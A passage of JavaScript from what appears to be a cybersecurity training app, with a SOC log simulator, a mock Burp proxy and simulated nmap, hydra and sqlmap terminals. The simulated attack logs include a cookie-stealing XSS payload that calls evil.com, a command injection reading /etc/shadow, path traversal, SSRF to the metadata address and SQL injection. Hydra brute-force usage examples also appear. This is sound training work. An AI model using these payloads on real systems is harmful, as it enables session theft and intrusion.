        this._cleanup = function() { target.removeEventListener('keydown', keydownHandler); };
      }
    },

    advance: function() {
      if (!this.active) return;
      this.cleanupListeners();
      this.current++;
      this.retryCount = 0;
      this.showStep();
    }
  };

  window.__cyberTutorialEngine = engine;
  engine.play(JSON.parse(${safeStepsLiteral}));
})();
`;

  const play = () => {
    if (!tut.requiresWebview) {
      if (!document.getElementById('cyber-tut-styles')) {
        const styleEl = document.createElement('style');
        styleEl.id = 'cyber-tut-styles';
        styleEl.textContent = tutorialCSS;
        document.head.appendChild(styleEl);
      }
      const scriptEl = document.createElement('script');
      scriptEl.textContent = tutorialEngineCode;
      document.body.appendChild(scriptEl);
      scriptEl.remove();
      return;
    }

    // If the first step has a hash, navigate there first
    if (tut.steps[0] && tut.steps[0].hash) {
      webviewEl.executeJavaScript(`window.location.hash = ${JSON.stringify(String(tut.steps[0].hash))};`);
      // Give Juice Shop a moment to route, then inject
      setTimeout(() => {
        webviewEl.insertCSS(tutorialCSS)
          .then(() => webviewEl.executeJavaScript(tutorialEngineCode))
          .catch(err => alert("Tutorial injection error (delayed): " + err.message));
      }, 1500);
    } else {
      webviewEl.insertCSS(tutorialCSS)
        .then(() => webviewEl.executeJavaScript(tutorialEngineCode))
        .catch(err => alert("Tutorial injection error: " + err.message));
    }
  };

  if (!tut.requiresWebview) {
    play();
  } else if (webviewLoading.style.display === 'flex') {
    webviewEl.addEventListener('did-finish-load', play, { once: true });
  } else {
    play();
  }

  // Show Mini Burp Proxy if the module requires interception
  if (tut.module === 'burp-proxy' || tut.module === 'sqli') {
    toggleMiniBurp(true);
  } else {
    toggleMiniBurp(false);
  }
}

/* ═══════════════════════════════════════════════════════════════════════════════
   SOC SIMULATOR LOGIC
   ═══════════════════════════════════════════════════════════════════════════════ */

let socStreamInterval = null;
let socFlaggedScenario = null; // scenario of the log entry the analyst flagged
let socLogs = [];

let currentSocScenario = 'sqli';
let originalRemediationHTML = '';

function startSocSimulator() {
  // Hide normal content and lab mode
  document.getElementById('contentArea').style.display = 'none';
  document.getElementById('labMode').style.display = 'none';
  document.getElementById('socMode').style.display = 'flex';
  
  const selectEl = document.getElementById('socScenarioSelect');
  if (selectEl) {
    currentSocScenario = selectEl.value;
  }
  
  // Save original HTML for resume
  const panel = document.getElementById('remediationPanel');
  if (panel && !originalRemediationHTML) {
    originalRemediationHTML = panel.innerHTML;
  }
  if (panel) {
    panel.classList.add('locked');
  }

  // Reset terminal
  const terminal = document.getElementById('socTerminal');
  terminal.innerHTML = '';
  socLogs = [];
  socFlaggedScenario = null;

  if (socStreamInterval) clearInterval(socStreamInterval);
  
  // Normal log generators
  function getRandomIp() {
    return Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
  }
  const paths = [
    '/images/logo.png', '/css/main.css', '/api/products', '/#/', '/rest/user/whoami',
    '/js/app.js', '/favicon.ico', '/api/challenges', '/assets/public/images/apple.png',
    '/rest/products/search', '/socket.io/?EIO=3&transport=websocket'
  ];
  const statuses = ['200', '200', '200', '304', '404', '401', '302', '201'];
  
  let lineCount = 0;
  
  socStreamInterval = setInterval(() => {
    lineCount++;
    const ip = getRandomIp();
    const method = Math.random() > 0.8 ? 'POST' : 'GET';
    const path = paths[Math.floor(Math.random() * paths.length)];
    const status = statuses[Math.floor(Math.random() * statuses.length)];
    const time = new Date().toISOString().split('T')[1].substring(0,8);
    
    let isMalicious = false;
    let actualIp = ip;
    let actualMethod = method;
    let actualPath = path;
    let actualStatus = status;
    
    // Pick actual scenario if random
    let activeScenario = currentSocScenario;
    if (activeScenario === 'random' || !activeScenario) {
      const allScenarios = ['sqli', 'xss', 'brute', 'path', 'cmdi', 'idor', 'ssrf'];
      activeScenario = allScenarios[Math.floor(Math.random() * allScenarios.length)];
    }
    
    if (lineCount % 17 === 0) {
      isMalicious = true;
      actualIp = '13.37.13.37';
      
      if (activeScenario === 'sqli') {
        actualMethod = 'GET';
        actualPath = '/api/users?id=1+UNION+SELECT+*+FROM+passwords--';
        actualStatus = '500';
      } else if (activeScenario === 'xss') {
        actualMethod = 'GET';
        actualPath = '/search?q=<script>fetch("http://evil.com?c="+document.cookie)</script>';
        actualStatus = '200';
      } else if (activeScenario === 'brute') {
        actualMethod = 'POST';
        actualPath = '/rest/user/login';
        actualStatus = '200';
      } else if (activeScenario === 'path') {
        actualMethod = 'GET';
        actualPath = '/ftp/../../../etc/passwd';
        actualStatus = '200';
      } else if (activeScenario === 'cmdi') {
        actualMethod = 'POST';
        actualPath = '/api/ping?host=127.0.0.1;cat+/etc/shadow';
        actualStatus = '200';
      } else if (activeScenario === 'idor') {
        actualMethod = 'GET';
        actualPath = '/rest/basket/5 (where 5 != user.id)';
        actualStatus = '200';
      } else if (activeScenario === 'ssrf') {
        actualMethod = 'POST';
        actualPath = '/api/webhook?url=http://169.254.169.254/latest/meta-data/';
        actualStatus = '200';
      }
    } else if (activeScenario === 'brute' && lineCount % 5 === 0) {
      // Background noise for brute force
      actualIp = '13.37.13.37';
      actualMethod = 'POST';
      actualPath = '/rest/user/login';
      actualStatus = '401';
    }
    
    const lineId = 'log-' + lineCount;
    const logLine = document.createElement('div');
    logLine.className = 'terminal-line';
    logLine.id = lineId;
    
    const escapedPath = escapeHtml(actualPath);
    logLine.innerHTML = `<span class="timestamp">[${time}]</span> <span class="ip">${actualIp}</span> <span class="method">${actualMethod}</span> ${escapedPath} HTTP/1.1" <span style="color:${actualStatus === '500' || actualStatus === '401' ? '#ff5f56' : '#27c93f'}">${actualStatus}</span>`;
    
    const lineScenario = isMalicious ? activeScenario : null;

    logLine.onclick = () => {
      // Deselect all
      document.querySelectorAll('.terminal-line').forEach(el => el.classList.remove('selected'));
      logLine.classList.add('selected');
      socFlaggedScenario = lineScenario;
      
      const intelPanel = document.getElementById('threatIntelPanel');
      if (intelPanel) {
        let riskScore = isMalicious ? Math.floor(Math.random() * 20 + 80) : Math.floor(Math.random() * 20 + 10);
        let geo = isMalicious ? 'Unknown/Tor' : 'US-EAST';
        let rep = isMalicious ? '<span style="color:var(--danger)">High Risk</span>' : '<span style="color:var(--success)">Clean</span>';
        let sourcePort = Math.floor(Math.random() * 50000 + 1024);
        let userAgent = isMalicious ? 'curl/7.68.0' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
        intelPanel.innerHTML = `
          <div class="intel-item" style="background:var(--bg-deep); padding:8px; border-radius:4px; margin-bottom:12px; border-left:3px solid var(--cyan);">
            <div style="font-size:10px; color:var(--text-muted); text-transform:uppercase; margin-bottom:4px;">Captured Request</div>
            <div style="color:var(--cyan); word-break:break-all;"><strong>${escapeHtml(actualMethod)}</strong> ${escapeHtml(actualPath)}</div>
            <div style="color:var(--text-secondary); margin-top:4px; font-size:11px;">Status: ${escapeHtml(actualStatus)}</div>
          </div>
          <div class="intel-item"><strong>IP Address:</strong> <span>${escapeHtml(actualIp)}</span></div>
          <div class="intel-item"><strong>Source Port:</strong> <span>${sourcePort}</span></div>
          <div class="intel-item"><strong>User Agent:</strong> <span>${escapeHtml(userAgent)}</span></div>
          <div class="intel-item"><strong>GeoLocation:</strong> <span>${geo}</span></div>
          <div class="intel-item"><strong>Threat Score:</strong> <span>${riskScore}/100</span></div>
          <div class="intel-item"><strong>Reputation:</strong> <span>${rep}</span></div>
          <div style="margin-top:15px; padding-top:10px; border-top:1px solid var(--border-accent);">
            <strong>Analysis:</strong><br>
            <span style="color:var(--text-secondary); font-size:11px;">
              ${isMalicious ? 'Pattern matches known exploitation signatures. Immediate mitigation required.' : 'Traffic patterns appear nominal. No malicious signatures detected.'}
            </span>
          </div>
        `;
      }
      
      if (isMalicious) {
        document.getElementById('remediationPanel').classList.remove('locked');
        const wafIndicator = document.getElementById('wafStatusIndicator');
        const wafAction = document.getElementById('wafLastAction');
        if (wafIndicator && wafAction) {
          wafIndicator.style.background = 'var(--danger)';
          wafIndicator.style.boxShadow = '0 0 10px var(--danger)';
          wafAction.textContent = 'Anomaly Detected. Awaiting Analyst Action.';
          wafAction.style.color = 'var(--danger)';
        }
      } else {
        document.getElementById('remediationPanel').classList.add('locked');
        // Briefly show error toast
        const toast = document.createElement('div');
        toast.style = 'position:fixed; bottom:20px; right:20px; background:var(--danger); color:white; padding:10px 20px; border-radius:4px; z-index:9999;';
        toast.textContent = 'False Positive. Keep looking.';
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 2000);
      }
    };
    
    // Check if scrolled to bottom BEFORE appending
    const isScrolledToBottom = terminal.scrollHeight - terminal.clientHeight <= terminal.scrollTop + 20;

    terminal.appendChild(logLine);
    
    // Keep max 100 lines
    if (terminal.children.length > 100) {
      terminal.removeChild(terminal.firstChild);
    }
    
    // Only auto-scroll if the user was already at the bottom
    if (isScrolledToBottom) {
      terminal.scrollTop = terminal.scrollHeight;
    }
  }, 800);
}

// Which remediation actions actually address each threat vector.
const VALID_REMEDIATION = {
  sqli:  ['BLOCK_IP'],
  xss:   ['BLOCK_IP'],
  path:  ['BLOCK_IP'],
  ssrf:  ['BLOCK_IP', 'ISOLATE'],
  brute: ['RATE_LIMIT', 'RESET'],
  cmdi:  ['ISOLATE'],
  idor:  ['RESET', 'ISOLATE']
};

function socToast(message, bg) {
  const toast = document.createElement('div');
  toast.style = `position:fixed; bottom:20px; right:20px; background:${bg}; color:white; padding:10px 20px; border-radius:4px; z-index:9999;`;
  toast.textContent = message;
  document.body.appendChild(toast);
  setTimeout(() => toast.remove(), 2000);
}

function submitRemediation(action) {
  // Must have flagged a real threat first.
  if (!socFlaggedScenario) {
    socToast('Flag a valid threat in the log before applying remediation.', 'var(--danger)');
    return;
  }

  const valid = VALID_REMEDIATION[socFlaggedScenario] || [];
  if (!valid.includes(action)) {
    socToast('Incorrect remediation for this threat vector. Try again.', 'var(--danger)');
    return;
  }

  // Update WAF UI
  const wafIndicator = document.getElementById('wafStatusIndicator');
  const wafAction = document.getElementById('wafLastAction');
  if (wafIndicator && wafAction) {
    wafIndicator.style.background = 'var(--success)';
    wafIndicator.style.boxShadow = '0 0 10px var(--success)';
    wafAction.textContent = 'Threat Mitigated: ' + action;
    wafAction.style.color = 'var(--success)';
  }

  if (socStreamInterval) { clearInterval(socStreamInterval); socStreamInterval = null; }
  socFlaggedScenario = null;
  const panel = document.getElementById('remediationPanel');
  panel.innerHTML = `
    <div style="text-align:center; padding:20px;">
      <div style="font-size:30px; line-height:1; margin-bottom:10px; color:var(--success);">&#10003;</div>
      <h3 style="color:var(--success); margin:0 0 10px 0;">Threat Neutralized!</h3>
      <p style="color:var(--text-secondary); font-size:13px;">Excellent work, Analyst. The ${escapeHtml(action)} policy has been applied and the network is secure.</p>
      <button class="btn btn-boot" onclick="window.__app.resumeSocSimulator()" style="margin-top:20px;">Continue Monitoring</button>
      <button class="btn btn-secondary" onclick="window.__app.exitSoc()" style="margin-top:20px; margin-left:10px;">Exit SOC</button>
    </div>
  `;

  // Award XP once per neutralised threat (not repeatable by re-clicking).
  if (window.__overlay && window.__overlay.stateManager) {
    const xpGained = 750;
    const sm = window.__overlay.stateManager;
    const oldLevel = sm.level;
    sm.totalXP += xpGained;
    sm.recalculateLevel();
    sm.persist();
    const leveledUp = sm.level > oldLevel;

    window.__overlay.renderer.showAchievementToast({
      challenge: 'SOC Analyst Training Complete',
      xp: xpGained,
      leveledUp
    });

    const prog = sm.getProgress();
    window.__overlay.renderer.updateXP(prog.totalXP, prog.xpPercent, leveledUp);
  }
}

function startChallenge(tutorialKey) {
  if (!isLabMode) toggleLabMode();
  
  if (!window.TUTORIALS || !window.TUTORIALS[tutorialKey]) return;
  const tut = window.TUTORIALS[tutorialKey];
  
  // Navigate if the first step has a hash, but don't play tutorial
  if (tut.steps && tut.steps[0] && tut.steps[0].hash) {
    const go = () => {
      webviewEl.executeJavaScript(`window.location.hash = ${JSON.stringify(String(tut.steps[0].hash))};`);
    };
    if (webviewLoading.style.display === 'flex') {
      webviewEl.addEventListener('did-finish-load', go, { once: true });
    } else {
      go();
    }
  }
}

/* ═══════════════════════════════════════════════════════════════════════════════
   UTILITIES
   ═══════════════════════════════════════════════════════════════════════════════ */

function escapeHtml(str) {
  const d = document.createElement('div');
  d.textContent = str;
  return d.innerHTML;
}

function escapeAttr(str) {
  return String(str == null ? '' : str).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function formatRisk(risk) {
  if (!risk) return '';
  const c = risk.toLowerCase();
  if (c === 'high')   return `<span class="risk-high">${risk}</span>`;
  if (c === 'medium') return `<span class="risk-medium">${risk}</span>`;
  if (c === 'low')    return `<span class="risk-low">${risk}</span>`;
  return risk;
}

/* ═══════════════════════════════════════════════════════════════════════════════
   MINI BURP PROXY LOGIC
   ═══════════════════════════════════════════════════════════════════════════════ */

const burpEditor = document.getElementById('burpPayloadEditor');
const btnBurpToggle = document.getElementById('btnBurpToggle');
const btnBurpForward = document.getElementById('btnBurpForward');
const btnBurpDrop = document.getElementById('btnBurpDrop');

let isProxyOn = true;
let isBurpSimulatorActive = false;

let currentProxyId = null;

// Each proxy achievement is awarded at most once per session so XP cannot be farmed.
const awardedProxyAchievements = new Set();

/** Awards XP for a proxy achievement once. Returns true if it was newly awarded. */
function awardProxyXp(id, label, xp) {
  if (awardedProxyAchievements.has(id)) return false;
  if (!(window.__overlay && window.__overlay.stateManager)) return false;
  awardedProxyAchievements.add(id);
  const sm = window.__overlay.stateManager;
  const oldLevel = sm.level;
  sm.totalXP += xp;
  sm.recalculateLevel();
  sm.persist();
  const leveledUp = sm.level > oldLevel;
  window.__overlay.renderer.showAchievementToast({ challenge: label, xp, leveledUp });
  const prog = sm.getProgress();
  window.__overlay.renderer.updateXP(prog.totalXP, prog.xpPercent, leveledUp);
  return true;
}

btnBurpToggle.addEventListener('click', () => {
  isProxyOn = !isProxyOn;
  window.labAPI.toggleProxy(isProxyOn);
  btnBurpToggle.textContent = isProxyOn ? 'Intercept is ON' : 'Intercept is OFF';
  btnBurpToggle.className = 'btn btn-sm ' + (isProxyOn ? 'btn-secondary active' : 'btn-danger');
});

btnBurpDrop.addEventListener('click', () => {
  if (isBurpSimulatorActive) {
    if (isCyberMartMode && currentProxyId && cyberMartView) {
      cyberMartView.contentWindow.dispatchEvent(new CustomEvent('proxy-response', {
        detail: { id: currentProxyId, action: 'drop' }
      }));
    }
    burpEditor.value = '';
    isBurpSimulatorActive = false;
    currentProxyId = null;
    return;
  }
  window.labAPI.dropProxyRequest();
  burpEditor.value = '';
});

btnBurpForward.addEventListener('click', () => {
  const modifiedData = burpEditor.value;
  
  if (isBurpSimulatorActive) {
    let email = '';
    let password = '';
    try {
      // Split on literal \n\n (escaped newlines in the raw HTTP string)
      const parts = modifiedData.split(/\r?\n\r?\n/);
      if (parts.length > 1) {
        const bodyJson = JSON.parse(parts[parts.length - 1].trim());
        email = bodyJson.email || '';
        password = bodyJson.password || '';
      }
    } catch(e) {}
    
    // Check if they successfully injected SQL syntax — award XP (once).
    if (email.includes("'") || email.toLowerCase().includes('or 1=1') || password.includes("'")) {
      awardProxyXp('sqli-via-proxy', 'SQL Injection via Proxy', 500);
    }

    if (isCyberMartMode && currentProxyId && cyberMartView) {
      cyberMartView.contentWindow.dispatchEvent(new CustomEvent('proxy-response', {
        detail: { 
          id: currentProxyId, 
          action: 'forward', 
          modifiedBody: `${modifiedData}` 
        }
      }));
    }
    
    burpEditor.value = '';
    isBurpSimulatorActive = false;
    currentProxyId = null;
    return;
  }
  
  window.labAPI.forwardProxyRequest(modifiedData);
  burpEditor.value = '';
  
  // Validation for Tutorial Progress (awarded once).
  if (modifiedData.toLowerCase().includes('or 1=1') || modifiedData.toLowerCase().includes('union select')) {
    awardProxyXp('proxy-injection', 'Proxy Injection Successful', 300);
  }
});



window.labAPI.onProxyIntercepted((data) => {
  // Switch to the proxy tab automatically
  window.__app.switchOverlayTab('proxy');
  burpEditor.value = data.body;
});

function toggleMiniBurp(show) {
  if (show) {
    // Switch to proxy tab
    window.__app.switchOverlayTab('proxy');
    isProxyOn = true;
    window.labAPI.toggleProxy(true);
    btnBurpToggle.textContent = 'Intercept is ON';
    btnBurpToggle.className = 'btn btn-sm btn-secondary active';
  } else {
    // Switch back to progress tab
    window.__app.switchOverlayTab('mission');
  }
}

function resumeSocSimulator() {
  const panel = document.getElementById('remediationPanel');
  if (panel && originalRemediationHTML) {
    panel.innerHTML = originalRemediationHTML;
  }
  
  const wafIndicator = document.getElementById('wafStatusIndicator');
  const wafAction = document.getElementById('wafLastAction');
  if (wafIndicator && wafAction) {
    wafIndicator.style.background = 'var(--success)';
    wafIndicator.style.boxShadow = '0 0 10px var(--success)';
    wafAction.textContent = '0 Threats Mitigated';
    wafAction.style.color = 'var(--text-secondary)';
  }
  
  const intelPanel = document.getElementById('threatIntelPanel');
  if (intelPanel) {
    intelPanel.innerHTML = '<p>Select a log entry to analyze IP reputation and threat score.</p>';
  }
  
  // Randomly pick a new scenario for variety
  const scenarios = ['random', 'sqli', 'xss', 'brute', 'path', 'cmdi', 'idor', 'ssrf'];
  const selectEl = document.getElementById('socScenarioSelect');
  if (selectEl) {
    if (selectEl.value !== 'random') {
       selectEl.value = scenarios[Math.floor(Math.random() * (scenarios.length - 1)) + 1];
    }
  }
  
  startSocSimulator();
}

/* ═══════════════════════════════════════════════════════════════════════════════
   SETTINGS & THEMES
   ═══════════════════════════════════════════════════════════════════════════════ */

function toggleSettings() {
  const modal = document.getElementById('settingsModal');
  if (modal.classList.contains('active')) {
    modal.classList.remove('active');
  } else {
    modal.classList.add('active');
  }
}

function toggleSidebar() {
  const sidebar = document.getElementById('sidebar');
  if (sidebar) {
    sidebar.classList.toggle('collapsed');
  }
}

/* ═══════════════════════════════════════════════════════════════════════════════
   TERMINAL SIMULATOR — Shared scaffolding
   Each handler calls simulateTerminalCommand() with its config; only the
   command-specific result logic lives inside each handler.
   ═══════════════════════════════════════════════════════════════════════════════ */

/**
 * Shared runner for nmap / hydra / sqlmap simulator terminals.
 * @param {object} cfg
 *   outputId    — element ID for the output div
 *   terminalId  — element ID for the scrollable terminal div
 *   loadingId   — unique ID for the transient "loading" span
 *   promptHtml  — the coloured prompt HTML (already escaped)
 *   guardFn     — fn(cmd) → string|null  (returns error message or null if OK)
 *   resolveFn   — fn(cmd) → { result: string, delay: number }
 */
function simulateTerminalCommand({ outputId, terminalId, loadingId, promptHtml, guardFn, resolveFn }) {
  return function(cmd) {
    const outputEl   = document.getElementById(outputId);
    const terminalEl = document.getElementById(terminalId);
    if (!outputEl) return;

    outputEl.innerHTML += `\n${promptHtml} ${escapeHtml(cmd)}\n`;

    const guardMsg = guardFn(cmd);
    if (guardMsg !== null) {
      outputEl.innerHTML += guardMsg + '\n';
      terminalEl.scrollTop = terminalEl.scrollHeight;
      return;
    }

    const { result, delay } = resolveFn(cmd);
    outputEl.innerHTML += `<span id="${loadingId}" style="color:var(--text-muted);">Executing...</span>`;
    terminalEl.scrollTop = terminalEl.scrollHeight;

    setTimeout(() => {
      const loading = document.getElementById(loadingId);
      if (loading) loading.remove();
      outputEl.innerHTML += result + '\n';
      terminalEl.scrollTop = terminalEl.scrollHeight;
    }, delay);
  };
}

/* ── NMAP SIMULATOR ─────────────────────────────────────────────────────────── */

const handleNmapCommand = simulateTerminalCommand({
  outputId:   'nmapSimOutput',
  terminalId: 'nmapSimTerminal',
  loadingId:  'nmapSimLoading',
  promptHtml: `<span style="color:var(--cyan);">[user@cyber-lab ~]$</span>`,
  guardFn: (cmd) => {
    if (!cmd.startsWith('nmap') && !cmd.startsWith('ping'))
      return `<span style="color:var(--danger);">Command not found or not supported in this simulator. Try 'nmap' or 'ping'.</span>`;
    return null;
  },
  resolveFn: (cmd) => {
    const isPing = cmd.startsWith('ping');
    const delay  = isPing ? 500 : 1500;
    let result = '';
    if (isPing) {
      result = `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2045ms
rtt min/avg/max/mdev = 0.032/0.037/0.041/0.003 ms`;
    } else if (cmd.includes('-A')) {
      result = `Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00013s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: OWASP Juice Shop
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Damn Vulnerable Web App

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds`;
    } else if (cmd.includes('-sV')) {
      result = `Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00015s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.12 seconds`;
    } else if (cmd.includes('-sn')) {
      result = `Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 192.168.1.1
Host is up (0.0020s latency).
Nmap scan report for 192.168.1.10
Host is up (0.0031s latency).
Nmap scan report for 192.168.1.105
Host is up (0.0011s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.34 seconds`;
    } else {
      result = `Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00014s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
3000/tcp open  ppp
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds`;
    }
    return { result, delay };
  }
});

/* ── HYDRA SIMULATOR ────────────────────────────────────────────────────────── */

function handleHydraCommand(cmd) {
  const outputEl   = document.getElementById('hydraSimOutput');
  const terminalEl = document.getElementById('hydraSimTerminal');
  if (!outputEl) return;

  outputEl.innerHTML += `\n<span style="color:#ec4899;">[user@cyber-lab ~]$</span> ${escapeHtml(cmd)}\n`;

  if (cmd === 'hydra' || cmd === 'hydra --help' || cmd === 'hydra -h') {
    outputEl.innerHTML += `Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]]
              [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]]
              [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET]
              [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
  -l LOGIN   : login with LOGIN name
  -L FILE    : load logins from FILE
  -p PASS    : try password PASS
  -P FILE    : load passwords from FILE
  -C FILE    : colon separated "login:pass" format
  -t TASKS   : run TASKS number of connects in parallel (default: 16)
  -w TIME    : max wait time in seconds (default: 32)
  -s PORT    : specify port
  -f          : exit after first found login/password pair
  -V          : verbose mode (show each attempt)
  -v          : very verbose mode
  -o FILE    : write found pairs to FILE
  -e nsr     : try "n" null password, "s" login as pass, "r" reversed

Supported services:
  ssh ftp http-post-form http-get-form mysql rdp smb telnet vnc

Example:
  hydra -l admin -P passwords.txt ssh://192.168.1.1
  hydra -l user -P pass.txt -s 8080 localhost http-post-form "/login:user=^USER^&pass=^PASS^:Failed"
`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
    return;
  }

  if (!cmd.startsWith('hydra')) {
    outputEl.innerHTML += `<span style="color:var(--danger);">Command not found. This simulator only supports 'hydra' commands. Type 'hydra' for help.</span>\n`;
    terminalEl.scrollTop = terminalEl.scrollHeight;
    return;
  }

  const isVerbose = cmd.includes('-V');
  const delay = isVerbose ? 2500 : 1800;

  outputEl.innerHTML += `<span id="hydraSimLoading" style="color:var(--text-muted);">Hydra starting at ${new Date().toLocaleTimeString()}...\n[DATA] Attacking target...</span>`;
  terminalEl.scrollTop = terminalEl.scrollHeight;

  setTimeout(() => {
    const loading = document.getElementById('hydraSimLoading');
    if (loading) loading.remove();

    let result = '';
    const timestamp = new Date().toLocaleTimeString();

    if (cmd.includes('ssh://') || cmd.includes('ssh:')) {
      const target = escapeHtml(cmd.match(/ssh:\/\/([^\s]+)/)?.[1] || '192.168.1.1');
      const user = escapeHtml(cmd.match(/-l\s+(\S+)/)?.[1] || 'admin');
      if (isVerbose) {
        result = `[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344392 login tests
[DATA] attacking ssh://${target}:22/
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "123456" - 1 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "password" - 2 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "12345678" - 3 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "qwerty" - 4 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "abc123" - 5 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "monkey" - 6 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "1234567" - 7 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "letmein" - 8 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "trustno1" - 9 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "dragon" - 10 of 14344392</span>
<span style="color:var(--success);">[22][ssh] host: ${target}   login: ${user}   password: dragon</span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at ${timestamp}`;
      } else {
        result = `[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344392 login tests
[DATA] attacking ssh://${target}:22/
<span style="color:var(--success);">[22][ssh] host: ${target}   login: ${user}   password: dragon</span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at ${timestamp}`;
      }
    } else if (cmd.includes('ftp://') || cmd.includes('ftp:')) {
      const target = escapeHtml(cmd.match(/ftp:\/\/([^\s]+)/)?.[1] || '192.168.1.1');
      const user = escapeHtml(cmd.match(/-l\s+(\S+)/)?.[1] || 'admin');
      result = `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344392 login tests
[DATA] attacking ftp://${target}:21/
<span style="color:var(--success);">[21][ftp] host: ${target}   login: ${user}   password: admin123</span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at ${timestamp}`;
    } else if (cmd.includes('http-post-form') || cmd.includes('http-get-form')) {
      const user = escapeHtml(cmd.match(/-l\s+(\S+)/)?.[1] || 'admin@juice-sh.op');
      const target = escapeHtml(cmd.match(/(?:localhost|(\d+\.\d+\.\d+\.\d+))/)?.[0] || 'localhost');
      if (isVerbose) {
        result = `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344392 login tests
[DATA] attacking http-post-form://${target}/
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "123456" - 1 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "password" - 2 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "admin123" - 3 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "iloveyou" - 4 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "princess" - 5 of 14344392</span>
<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "admin" - 6 of 14344392</span>
<span style="color:var(--success);">[80][http-post-form] host: ${target}   login: ${user}   password: admin123</span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at ${timestamp}`;
      } else {
        result = `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344392 login tests
[DATA] attacking http-post-form://${target}/
<span style="color:var(--success);">[80][http-post-form] host: ${target}   login: ${user}   password: admin123</span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at ${timestamp}`;
      }
    } else {
      // Generic / unrecognized hydra flags
      result = `[WARNING] No valid target service specified.
[ERROR] Hydra requires a target in the format: service://host
Example: hydra -l admin -P passwords.txt ssh://192.168.1.1
Type 'hydra' for full usage.`;
    }

    outputEl.innerHTML += result + '\n';
    terminalEl.scrollTop = terminalEl.scrollHeight;
  }, delay);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   SQLMAP SIMULATOR
   ═══════════════════════════════════════════════════════════════════════════════ */

function handleSqlmapCommand(cmd) {
  const outputEl = document.getElementById('sqlmapSimOutput');
  const terminalEl = document.getElementById('sqlmapSimTerminal');
  if (!outputEl) return;

  outputEl.innerHTML += `\n<span style="color:#fb923c;">[sqlmap]$ </span>${escapeHtml(cmd)}\n`;
  terminalEl.scrollTop = terminalEl.scrollHeight;

  if (cmd === 'sqlmap --help' || cmd === 'sqlmap -h') {
